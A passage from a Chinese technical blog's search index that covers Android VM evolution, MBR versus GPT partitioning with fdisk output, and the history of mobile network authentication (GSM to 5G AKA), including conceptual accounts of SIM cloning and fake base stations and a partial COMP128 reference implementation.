应用作为一个独立的Linux进程执行，防止在虚拟机崩溃的时候所有程序都被关闭。<br> 具体来说，DVM由Zygote创建和初始化，每当系统需要创建一个应用程序时，Zygote就会fork自身，快速地创建和初始化一个DVM实例，用于应用程序的运行。</li>\n</ol>\n<p>Dalvik VM的主要问题是性能！<br>早期的纯解释器执行显然速度慢，Android 2.2加入了JIT编译器，采用了解释器+JIT编译的方式，虽然运行性能提升了，可是每次启动应用都需要动态编译生成机器码，这会拖慢应用的启动速度。</p>\n<h3 id=\"2-中期的ART虚拟机\"><a href=\"#2-中期的ART虚拟机\" class=\"headerlink\" title=\"2. 中期的ART虚拟机\"></a>2. 中期的ART虚拟机</h3><ul>\n<li>2013年，Android 4.4引入了ART VM，改为AOT - Ahead Of Time的编译模式（静态编译）。<br>  其运行模式是：应用在第一次安装的时候，字节码就会预先编译成机器码，使其成为真正的本地应用；之后打开App的时候，不需要额外的翻译工作，直接使用本地机器码运行。</li>\n<li>2014年，Android 5.0发布，ART取代了Dalvik成为了VM，同时AOT也成为了唯一的编译模式。</li>\n</ul>\n<p>对比Dalvik，ART是安装的时候就编译好了，执行的时候直接运行机器码，开启应用速度明显提高。</p>\n<blockquote>\n<p>有一段时间，Huawei手机总是提示<strong>正在进行APP优化</strong>，其实就是编译生成机器码。</p>\n</blockquote>\n<p>但是，ART的缺点也是明显的，一是应用安装的时间长，二是消耗更多的存储空间，因为需要持久化保存机器码。</p>\n<h3 id=\"3-全新的Hybrid模式-Interpreter-JIT-AOT\"><a href=\"#3-全新的Hybrid模式-Interpreter-JIT-AOT\" class=\"headerlink\" title=\"3. 全新的Hybrid模式(Interpreter + JIT + AOT)\"></a>3. 全新的Hybrid模式(Interpreter + JIT + AOT)</h3><p>2016年，Android N 引入了一种包含编译、解释和 JIT（Just In Time）的混合运行时，以便在安装时间、内存占用、电池消耗和性能之间获得最好的折衷.<br>这种混合模式仍被简称为 AOT，但是其含义变成“全时段的编译”（All-Of-the-Time compilation）</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/Android-N.png\" class=\"\">\n\n<p>其主要特征为：</p>\n<ol>\n<li>在App第一次启动的时候，系统会直接以Intercept的方式来运行，以便快速启动；</li>\n<li>在App第一次启动的同时，启动<code>Compilation Daemon Service</code>服务，负责在系统空闲的时候，后台ART针对<strong>热代码</strong>进行静态编译，其他代码不做编译;</li>\n<li>ART包含了一个新的、更快的JIT解释器，负责动态生成机器码，但并不是进行持久化存储；</li>\n<li>代码在执行期间被分析函数调用情况，分析结果保存在<code>Profile</code>文件中，以便未来生成AOT，这就是<code>Profile Guided AOT</code>；</li>\n<li>ART采用了深度内联等几种更高级的技巧，对代码进行更深度的优化。</li>\n</ol>\n<p>这种混合使用 AOT、解释、JIT 的策略的全部优点如下</p>\n<ul>\n<li>即使是大应用，安装时间也能缩短到几秒</li>\n<li>系统升级能更快地安装，因为不再需要优化这一步</li>\n<li>应用的内存占用更小，有些情况下可以降低 50%</li>\n<li>改善了性能</li>\n<li>更低的电池消耗</li>\n</ul>\n<h2 id=\"四、结论\"><a href=\"#四、结论\" class=\"headerlink\" title=\"四、结论\"></a>四、结论</h2><ol>\n<li>与Javascript V8引擎相似，Android虚拟机也走向了混合编译模式。</li>\n<li>华为的方舟编译器，宣称抛弃了虚拟机，全部采用机器码，支持Java和C++的混合编译，但又宣称自主设计了统一的中间表示MapleIR，后续可以深入研究与Java的关系？</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li><a href=\"https://web.archive.org/web/20110925050249/http://java.sun.com/docs/books/vmspec/2nd-edition/html/VMSpecTOC.doc.html\">JCP发布的Java Virtual Machine蓝皮书</a></li>\n<li><a href=\"https://developer.android.com/reference/dalvik/bytecode/Opcodes.html\">Android Dalvik 的字节码清单</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Comparison_of_Java_virtual_machines\">主流Java Virtual Machine的技术对比 - Wiki主页</a></li>\n<li>《深入理解Java虚拟机：JVM高级特性与最佳实践》 周志明 著</li>\n</ul>\n<h3 id=\"技术研究\"><a href=\"#技术研究\" class=\"headerlink\" title=\"技术研究\"></a>技术研究</h3><ul>\n<li><a href=\"https://blog.csdn.net/zhongyili_sohu/article/details/106555297\">一文让你搞懂各种虚拟机、解释器、JIT和AOT编译器</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/34426768\">关于Jvm知识看这一篇就够了</a></li>\n<li><a href=\"https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html\">Java即时编译器原理解析及实践 - 美团技术</a></li>\n<li><a href=\"https://tech.youzan.com/qian-tan-android-dexwen-jian/\">浅谈 Android Dex 文件 - 有赞技术</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1445764\">Android虚拟机的JIT编译器</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000040710467\">Dalvik 和 Java 字节码的比较</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1663852\">一文读懂 DEX 文件格式解析</a></li>\n<li><a href=\"https://bbs.huaweicloud.com/blogs/detail/105435\">首次全面深度解密华为方舟编译器</a></li>\n</ul>\n"},{"title":"硬盘分区表之MBR和GPT","url":"/2020/06/20/%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA%E8%A1%A8%E4%B9%8BMBR%E5%92%8CGPT/","content":"<h2 id=\"名词解释\"><a href=\"#名词解释\" class=\"headerlink\" title=\"名词解释\"></a>名词解释</h2><p>磁盘管理模式：</p>\n<ul>\n<li><p>MBR（Master Boot Record）：即硬盘的主引导记录分区列表，在主引导扇区，位于硬盘的cylinder 0， head 0， sector 1 （Sector是从1开始的）。</p>\n</li>\n<li><p>GPT（GUID Partition Table）：即全局唯一标识分区列表，是一个物理硬盘的分区结构。它用来替代BIOS中的主引导记录分区表（MBR）。</p>\n</li>\n</ul>\n<p>主板接口标准：</p>\n<ul>\n<li><p>BIOS（Basic Input Output System）：它的全称应该是ROM－BIOS，意思是只读存储器基本输入输出系统。其实，它是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、系统设置信息、开机上电自检程序和系统启动自举程序。 其主要功能是为计算机提供最底层的、最直接的硬件设置和控制。</p>\n</li>\n<li><p>UEFI（Unified Extensible Firmware Interface)：全称“统一的可扩展固件接口”， 是一种详细描述全新类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上，从而使开机程序化繁为简，节省时间。</p>\n</li>\n</ul>\n<h2 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h2><p>MBR是传统的分区表类型，最大的缺点则是不支持容量大于2T的硬盘。GPT则弥补了MBR这个缺点，最大支持18EB的硬盘，是基于UEFI使用的磁盘分区架构。</p>\n<p>传统BIOS主要支持MBR引导，UEFI则是取代传统BIOS，它加入了对新硬件的支持，其中就有2TB以上硬盘。</p>\n<p>目前所有Windows系统均支持MBR，而GPT只有64位系统才能支持。BIOS只支持MBR引导系统，而GPT仅可用UEFI引导系统。正因为这样，现在主板大多采用BIOS集成UEFI，或UEFI集成BIOS，以此达到同时兼容MBR和GPT引导系统的目的。</p>\n<p>UEFI启动引导系统的方法是查找硬盘分区中第一个FAT分区内的引导文件进行系统引导，这里并无指定分区表格式。所以U盘和移动硬盘可以用MBR分区表，创建一个FAT分区放置引导文件，从而达到可以双模式启动的目的。但需要注意的是，UEFI虽然支持MBR启动，但必须要有UEFI引导文件存放在FAT分区下；UEFI是无法使用传统MBR引导来启动系统的。</p>\n<p>由于GPT引导系统的方式与MBR不同，故而使用传统系统安装办法（如Ghost、Win$Man等）会导致出现系统无法引导的现象。而且使用GPT引导系统的话，必要时还得调整主板设置，开启UEFI（大部分主板默认开启UEFI）。但是使用UEFI和GPT，只是支持大于容量2T的硬盘，并不会带来质的提升（开机硬件自检会稍微快了那么1、2秒）。所以，如果不用大于2T的硬盘做系统的话，就没必要使用UEFI。</p>\n<ul>\n<li><p>BIOS+MBR：这是最传统的，系统都会支持；唯一的缺点就是不支持容量大于2T的硬盘。</p>\n</li>\n<li><p>BIOS+GPT：BIOS是可以使用GPT分区表的硬盘来作为资料盘的，但不能引导系统；若电脑同时带有容量小于2T的硬盘和容量大于2T的硬盘，小于2T的可以用MBR分区表安装系统，而大于2T的可以使用GPT分区表来存放资料。但系统须使用64位系统。</p>\n</li>\n<li><p>UEFI+MBR：可以把UEFI设置成Legacy模式（传统模式）让其支持传统MBR启动，效果同BIOS+MBR；也可以建立FAT分区，放置UEFI启动文件来，可应用在U盘和移动硬盘上实现双模式启动。</p>\n</li>\n<li><p>UEFI+GPT：如果要把大于2T的硬盘作为系统盘来安装系统的话，就必须如此。而且系统须使用64位系统，否则无法引导。但系统又不是传统在PE下安装后就能直接使用的，引导还得经过处理才行。</p>\n</li>\n</ul>\n<h2 id=\"实际案例\"><a href=\"#实际案例\" class=\"headerlink\" title=\"实际案例\"></a>实际案例</h2><p>Ubuntu安装完成后，主机硬盘的默认分区表为GPT格式（不是MBR格式），包含了两个分区，其中：</p>\n<ul>\n<li><code>/dev/sda1</code>：用于EFI启动，512M</li>\n<li><code>/dev/sda2</code>：Linunx系统盘</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# fdisk -l</span><br><span class=\"line\">Disk /dev/loop0: 89.1 MiB, 93417472 bytes, 182456 sectors</span><br><span class=\"line\">Units: sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disk /dev/sda: 111.8 GiB, 120034123776 bytes, 234441648 sectors</span><br><span class=\"line\">Units: sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\">Disklabel type: gpt</span><br><span class=\"line\">Disk identifier: D8D94899-BC23-4D81-96EB-ECAFE4710A7E</span><br><span class=\"line\"></span><br><span class=\"line\">Device       Start       End   Sectors   Size Type</span><br><span class=\"line\">/dev/sda1     2048   1050623   1048576   512M EFI System</span><br><span class=\"line\">/dev/sda2  1050624 234438655 233388032 111.3G Linux filesystem</span><br></pre></td></tr></table></figure>\n"},{"title":"移动通信网的鉴权认证技术","url":"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/","content":"<p>先给个总体演进图。</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/vs.png\" alt=\"VS\"></p>\n<h2 id=\"一、基本概念\"><a href=\"#一、基本概念\" class=\"headerlink\" title=\"一、基本概念\"></a>一、基本概念</h2><p>移动通信网通常由三个部分组成，即核心网 (CN，core network)、无线接入网(RAN，radio access network)和用户设备(UE，user equipment)。 其中移动用户设备属于用户个人，由用户直接控制，接入网与核心网属于运营商，由运营商直接控制。如果用户希望使用运营商服务和网络资源，需要用户和运营商共同协商，这就涉及鉴权认证，判明和确认通信双方真实身份。</p>\n<p>移动通信网的鉴权认证过程采用的是古老的“Challenge - Response”（挑战 - 响应）的机制，即认证方向被认证方发送一个“挑战”（一般是一个随机数），被认证方基于双方共有密钥，以及挑战中所包含的信息计算一个“响应”。显然，只有拥有密钥的参与方才能正确计算出这个响应。</p>\n<blockquote>\n<p>一般情况下，认证可基于被认证方拥有一个独特的、不可复制的构件；或者双方都知道的一个秘密；又或者被认证方的某种唯一特征。<br>除第一代模拟通信外，从2G开始的移动通信网络的认证综合了前两种方式：一个共同的秘密（密钥）和被认证方一个独特的构件（SIM&#x2F;USIM卡）。</p>\n</blockquote>\n<p>移动通信网的鉴权认证是移动网络与终端用户之间相互识别的过程，核心是解决两个问题：</p>\n<ol>\n<li><p><strong>你是谁?</strong><br> 基于国际移动用户识别号 IMSI（International Mobile Subscriber Identification）。<br> IMSI 定义为 15 位的十进制数，其结构为：MCC + MNC + MSIN。<br> 全球运营商统一编码，是唯一且固定的身份标识，SIM&#x2F;USIM 卡中存储了该数据。</p>\n</li>\n<li><p><strong>你是不是你?</strong><br> 基于永久性的根密钥 Ki，长度是 16 个字节，也就是 128 比特位。<br> 认证就是基于 Ki 共同秘密，配合一些其他的参数，基于一定的认证算法和协议过程而展开。<br> Ki 仅在运营商的 AUC（Authentication Center）和用户的 SIM&#x2F;USIM 卡中存储，基于根密钥的计算都在内部进行，绝对不允许对外暴露。<br> 后续需要使用的其它密钥（例如通信密钥 Kc），都是基于 Ki 通过不可逆的算法衍生出来的。</p>\n</li>\n</ol>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/GSM-arch.jpg\" alt=\"GSM\"></p>\n<p>AUC 和 SIM&#x2F;USIM 是移动通信网安全的基石之一。AUC在运营商网络之内，在物理上、管理机制上、安全防护手段上都有严格的要求，卡则散落在用户手里，是不可控的环境。通常卡都采用抵制篡改（tamper-resist）的硬件设计，即要求不能从卡内读出卡内的信息，从而防止信息的泄露。</p>\n<h2 id=\"二、GSM-的-鉴权流程\"><a href=\"#二、GSM-的-鉴权流程\" class=\"headerlink\" title=\"二、GSM 的 鉴权流程\"></a>二、GSM 的 鉴权流程</h2><h3 id=\"1-三元组认证向量（RAND、XRES、Kc）\"><a href=\"#1-三元组认证向量（RAND、XRES、Kc）\" class=\"headerlink\" title=\"1. 三元组认证向量（RAND、XRES、Kc）\"></a>1. 三元组认证向量（RAND、XRES、Kc）</h3><p>GSM 系统的鉴权流程在 GSM09.02 MAP 中定义，核心是三元组认证向量（RAND、XRES、Kc）。</p>\n<ul>\n<li>RAND：移动网络AUC提供的随机数</li>\n<li>XRES&#x2F;SRES：AUC侧计算的期望响应值（eXperted RESponse），卡侧计算的鉴权响应值（Signed RESponse），检测 XRES &#x3D;&#x3D; SRES</li>\n<li>Kc：通信使用的一次性会话密钥，用于 A5 算法的加密输入</li>\n</ul>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/GSM.jpeg\" alt=\"GSM\"></p>\n<p>在这个6步的过程里面同时实现了认证和会话密钥协商，称为AKA（Authentication and Key Agreement，会话与密钥协商）协议。</p>\n<h3 id=\"2-COMP128-1-算法和克隆卡问题\"><a href=\"#2-COMP128-1-算法和克隆卡问题\" class=\"headerlink\" title=\"2. COMP128-1 算法和克隆卡问题\"></a>2. COMP128-1 算法和克隆卡问题</h3><p>AKA 协议定义了 A3 和 A8 算法，其中 A3 算法以 Ki 和 RAND 作为输入参数，负责生成 SRES（32bits），A8 算法同样以 Ki 和 RAND 作为输入参数，负责生成后续用于通信加密的会话密钥 Kc（64bits）。由于这两个算法的输入参数完全相同，绝大多数运营商都直接采用 COMP128-1算法。</p>\n<p>COMP128-1 算法于1987年设计，1991年投入使用，其设计较为简单，其实现仅需20行代码，在最初设计与使用时，所有参与方签订协议对方法进行保密。</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/comp128-struct.jpg\" alt=\"COMP128\"></p>\n<blockquote>\n<p>R 为轮函数，P 为置换，F 为置换与抽取。由于R、P、F均为高强度非线性运算，整体呈现哈希的雪崩特性。</p>\n</blockquote>\n<p>1998年，COMP128-1 算法被泄露，随即在1999年即被破解。究其原因，由于COMP128-1 算法中输入的信息（128bits）大于输出的信息（96bits,即SRES+Kc），因此必然会出现不同的输入产生相同的输出，也就是“碰撞”，而且由于字节压缩得很厉害，很容易找到“碰撞”。</p>\n<p>2000年，出现了对应的SIM卡破解软件，攻击者输入大量连续的数据就能轻易获得碰撞，以此来推算出密钥Ki。一旦计算出Ki，SIM卡就可被复制。因此，对SIM卡的破解并不是从智能卡中读取了机密信息，而是利用算法的脆弱性实施了计算破解。</p>\n<h3 id=\"3-单向鉴权和伪基站问题\"><a href=\"#3-单向鉴权和伪基站问题\" class=\"headerlink\" title=\"3. 单向鉴权和伪基站问题\"></a>3. 单向鉴权和伪基站问题</h3><p>GSM 认证机制最大的缺陷是“单向认证”，就是说只有网络认证用户的真实性，而用户不认证网络。</p>\n<p>2009年，OpenBTS软件发布，攻击者购置主机和笔记本电脑，再加上一个射频装置，通过<strong>中间人攻击</strong>方式构造“伪基站”，其基本流程是：</p>\n<ul>\n<li>伪基站设备发射高强度的非法信号，用户终端自动连接到信号强度最高的基站并发送注册请求，这便暴露了自己的 IMSI</li>\n<li>伪基站设备侦听设备，冒充目标终端向运营商真实网络侧发起注册请求</li>\n<li>伪基站设备把网络下发的 RAND 转给受害者移动终端，并把终端返回的 SRES 转给网络，这就完成了鉴权认证流程</li>\n</ul>\n<p>理论上说，如果伪基站接入了运营商网络，可以解析信令数据并通过 A5 算法解密话音数据，从而实现主叫通话的窃听功能（此时无法做被叫，因为终端未在公众通信网络注册），但由于这些功能实现较为复杂，实际上典型的犯罪应用是短信欺诈，即伪装成任意号码（例如95588、95533、10086等银行或通信运营商的客服号码）下发垃圾短信，或者伪造短信验证码。</p>\n<h2 id=\"三、CDMA-的鉴权流程\"><a href=\"#三、CDMA-的鉴权流程\" class=\"headerlink\" title=\"三、CDMA 的鉴权流程\"></a>三、CDMA 的鉴权流程</h2><p>CDMA 系统的鉴权流程在 IS-41 MAP 中被详细定义。<br>CDMA 系统中用于移动台鉴权的密码分为两级，第一级为移动台的密钥 A_Key，第二级为共享加密数据(SSD，shared secret data)。</p>\n<ul>\n<li>密钥 A_Key是高级密码，长度为 64 bit，由运营商分配，它和 IMSI 一同被写入移动终端永久性存储器中。<br>  同时，运营商核心网存储该用户的 IMSI 和对应的 A_Key。该密钥是永久性的，不在网络和空中信道上传播。</li>\n<li>SSD 是低级密码，长为 128 bit(分为 SSD_A 为 64 bit 和 SSD_B 为 64 bit)，它由A_Key 运算产生，存在于移动台、鉴权中心和拜访者位置寄存器。<br>  在鉴权过程中，核心网使用RAND 和 SSD_A 计算出期望的响应 AUTHx，倘若移动终端计算的 AUTHx(用 RAND 和 SSD_A计算所得)和核心网计算的 AUTHx 相同，则鉴权成功，攻击者因没有正确有效的 SSD 值，无法计算得到核心网所期望的 AUTHx 值导致鉴权 失败]。</li>\n</ul>\n<h2 id=\"四、3G（UTMS）的鉴权流程\"><a href=\"#四、3G（UTMS）的鉴权流程\" class=\"headerlink\" title=\"四、3G（UTMS）的鉴权流程\"></a>四、3G（UTMS）的鉴权流程</h2><p>2000年，ITU 制定 3G 空口传输标准制式的时候，针对2G智能卡及网络的破解攻击已经存在。因此，在 3G 网络认证标准制定时，采用了两项关键技术：一是建立“用户+网络”的<strong>双向认证机制</strong>，二是将智能卡升级为USIM卡（Universal Subscriber Identity Module，全球用户识别卡），并选用更加安全的认证算法。</p>\n<blockquote>\n<p>CMCC是个特例！因为政府只给了 TD-SCDMA 牌照，巨大的市场压力下提出“不换号、不换卡”的业务策略，直到 4G 时代才将 SIM 卡换成 USIM 卡。</p>\n</blockquote>\n<h3 id=\"1-五元组认证向量（RAND-XRES-CK-IK-AUTN）\"><a href=\"#1-五元组认证向量（RAND-XRES-CK-IK-AUTN）\" class=\"headerlink\" title=\"1. 五元组认证向量（RAND, XRES, CK, IK, AUTN）\"></a>1. 五元组认证向量（RAND, XRES, CK, IK, AUTN）</h3><p>3G 标准的鉴权流程与 GSM 基本相同，关键是用户认证向量发生变化。</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/3G-1.jpg\" alt=\"1\"></p>\n<ol>\n<li>在第三步中，网络侧发送<code>(RAND，AUTN)</code>。不仅有用于挑战的随机数 RAND，还增加了 AUTN（Authentication Token）参数，使得 USIM 可以鉴别网络的真伪，防止接入伪基站<ul>\n<li>GSM 中的长期密钥Ki，3G 标准改名为 K，GSM AKA 也改为 UMTS AKA</li>\n<li>AUTN 通过终端与归属网络之间的共享密钥K，以及一些其他输入参数计算得出</li>\n</ul>\n</li>\n<li>在第四步中，如果 AUTN 验证通过，USIM 基于长期密钥 K 计算形成<code>(XRES，CK，IK)</code>。<ul>\n<li>XRES：挑战的响应值，第五步将此上报给网络侧，实现网络对用户的认证，</li>\n<li>CK：机密性保护密钥，与GSM的 Kc 对应</li>\n<li>IK：完整性保护密钥，3G 标准新增</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"2-MILENAGE-算法簇\"><a href=\"#2-MILENAGE-算法簇\" class=\"headerlink\" title=\"2. MILENAGE 算法簇\"></a>2. MILENAGE 算法簇</h3><p>3GPP 使用代号为$f1$ - $f5$ 的5个算法来产生认证向量，但允许运营商自行决定采用何种具体算法，因为这些算法应用于 USIM 和 AUC 之间，不涉及到运营商之间的互操作。<br>3GPP 推荐使用基于 AES 的 MILENAGE 算法簇，加密分组和密钥长度都是128比特，</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/network.png\" alt=\"N\"></p>\n<ul>\n<li>SQN：48bit序列号，通过序列号确保每个认证向量不会被重放；</li>\n<li>AK：48bit用于隐藏序列号的临时密钥，基于K和RAND生成；</li>\n<li>MAC：64bit，用于构成AUTN的主要变量，由于包含了K的计算，可用于作为网络认证；</li>\n<li>AMF：Authentication Management Field，共16bit，未标准化。在4G的时候，最高位被用于区分AMF所在的认证向量是4G的认证向量还是3G的认证向量，因为4G和3G可能会共用HSS&#x2F;AuC。</li>\n</ul>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/usim.png\" alt=\"N\"></p>\n<ul>\n<li>$f1(SQN, AFM, K) \\Rightarrow MAC$</li>\n<li>$f2(K，RAND) \\Rightarrow XRES$</li>\n<li>$f3(K, RAND) \\Rightarrow CK$</li>\n<li>$f4(K, RAND) \\Rightarrow IK$</li>\n<li>$f5(K, RAND) \\Rightarrow AK$</li>\n<li>$AUTN &#x3D; SQN \\oplus AK || MAC || AMF$</li>\n</ul>\n<p>理论上来说，在3G认证过程实施之后就不会再出现伪基站了，但也有一些例外情况，如为了方便2G存量用户的使用，3G网络在推荐使用USIM卡接入的基础上、同时也允许SIM卡直接认证后接入；因此，对于使用SIM卡接入网络的用户还是容易受到2G伪基站的攻击。<br>另外，3G认证协议标准化不久，就发现易受到重定向攻击 (redirection attack) ，2017年的黑帽大会上有针对4G网络攻击案例被披露.</p>\n<h2 id=\"五、4G-的鉴权流程\"><a href=\"#五、4G-的鉴权流程\" class=\"headerlink\" title=\"五、4G 的鉴权流程\"></a>五、4G 的鉴权流程</h2><p>4G 基本沿用了3G认证的协议流程和认证算法，只在卡的兼容性和后续密钥的衍生方面有少量的修改，称为 EPS-AKA，主要改进包括：</p>\n<ol>\n<li>LTE 仅允许 USIM 接入，不允许 SIM 接入，意味着双向认证和信令的完整性保护是必选的。<br>但在少量特殊的情况下，例如终端被叫因为不支持 VoLTE 而被切换到 2G，或者 4G 过载向 2G 进行切换时，可能仍然存在伪基站的问题，2017 年的黑帽大会上就曝出了一个“呼叫劫持”漏洞。</li>\n<li>为了支持 WLAN 的接入方式，提供了扩展的 EAP-AKA 和 EAP-AKA’ 认证。<br>EAP-AKA 是将 AKA 认证过程使用 EAP 协议进行封装，其核心参数仍然是AKA认证向量，参与认证的网元有UE、AC、AAA Server、HSS。<br><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/eap.jpg\" alt=\"1\"></li>\n</ol>\n<h2 id=\"六、5G-的鉴权流程\"><a href=\"#六、5G-的鉴权流程\" class=\"headerlink\" title=\"六、5G 的鉴权流程\"></a>六、5G 的鉴权流程</h2><p>5G 继承了 AKA 作为网络接入的认证方式，重点考虑认证体系的扩展，主要改进包括：</p>\n<ol>\n<li>增强了归属网络对认证的控制。<br>5G-AKA 对认证向量进行一次单向变换，拜访地运营商仅能获取漫游用户经过变换之后的认证向量，并将漫游用户反馈的认证结果发送给归属地。<br><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/6g.jpg\" alt=\"6\"></li>\n<li>统一的认证框架更好支持 WLAN 等非蜂窝通信网络。<br> 一方面，5G 无线网接入可以采用 EAP-AKA’ 认证方式，EAP-AKA’认证方式提升到了和 5G-AKA 并列的位置；另一方面，EAP-AKA’ 认证和 5G-AKA 认证在网络架构上使用了同样的网元，意味着5G的认证网元在标准上必须同时支持这两种认证方式。</li>\n</ol>\n<h2 id=\"七、-总结\"><a href=\"#七、-总结\" class=\"headerlink\" title=\"七、 总结\"></a>七、 总结</h2><p>通信网络的认证协议，基于“挑战-响应”的AKA协议是一条贯穿始终的线索。但从2G到5G，AKA也一直在演进以适应形势的变化。所谓形势，主要是新的威胁的出现，或一些预期的安全风险逐渐变成现实。毕竟，算力在不断强大，而网络越来越复杂。AKA的演进，在AKA的前缀上表现出来：在2G的时候，AKA就叫AKA；在3G的时候，应对伪基站风险，增加了双向认证，解决了用户对网络的信任问题，3G的AKA被称为UMTS AKA；在4G的时候，Authentication部分没有变化，但Key Agreement发生了变化，针对无线网络、核心网络，衍生出不同的密钥，解决了无线网和核心网的互信问题，4G的AKA被称为EPS AKA；5G的AKA增强了归属网络的控制，解决归属网络和拜访网络的互信问题，并被称为5G AKA。</p>\n<p>相对来说，算法变动倒是相对小些，在2G被证明不安全的COMP128在3G之后就被可以以AES为核心的MILENAGE替代，目前这个部分仍然被认为是安全的。</p>\n<p>在AKA这条主脉络之外，5G作为一个“野心勃勃”的网络，在认证上也体现出与以往几代不同之处，如EAP。在4G的时候可以作为WLAN接入的认证方式，但并非特别重要。在5G中，EAP还承载了为外部数据网络提供认证服务、为垂直行业应用提供认证服务的职能，充分体现了5G希望超越“人与手机”的单一形态，从设计上就契合物联网、工业互联网等形态的需求。</p>\n<hr>\n<h2 id=\"附录一：COMP128-算法实现\"><a href=\"#附录一：COMP128-算法实现\" class=\"headerlink\" title=\"附录一：COMP128 算法实现\"></a>附录一：COMP128 算法实现</h2><p>COMP128 - Details</p>\n<ol>\n<li>x[16-31] &#x3D; RAND</li>\n<li>for 0&lt;i&lt;8<br>  x[0-15] &#x3D; Ki<br>  call Compression (5 rounds)<br>  call FormBitsFromBytes<br>  if i&lt;7 call Permute</li>\n</ol>\n<p>Compress 16-byte result to 12-bytes, store in simoutput[] and return.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">comp128v1</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">uint8_t</span> *ki, <span class=\"type\">const</span> <span class=\"type\">uint8_t</span> *rand, <span class=\"type\">uint8_t</span> *sres, <span class=\"type\">uint8_t</span> *kc)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> x[<span class=\"number\">32</span>], bits[<span class=\"number\">128</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* x[16-31] = RAND */</span></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(&amp;x[<span class=\"number\">16</span>], rand, <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Round 1-7 */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">7</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* x[0-15] = Ki */</span></span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span>(x, ki, <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Compression */</span></span><br><span class=\"line\">        _comp128_compression(x);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* FormBitFromBytes */</span></span><br><span class=\"line\">        _comp128_bitsfrombytes(x, bits);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Permutation 